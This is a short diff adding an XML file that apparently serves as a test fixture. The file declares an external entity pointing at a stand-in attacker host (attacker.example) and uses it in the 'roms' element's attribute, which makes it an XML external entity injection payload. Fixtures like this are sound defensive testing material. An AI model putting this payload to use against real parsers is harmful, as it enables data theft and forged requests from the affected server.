@@ -1,0 +1,5 @@
+<?xml version="1.0"?>
+<!DOCTYPE roms [
+  <!ENTITY xxe PUBLIC "-//EVIL//X" "http://attacker.example/x">
+]>
+<roms a="&xxe;"/>
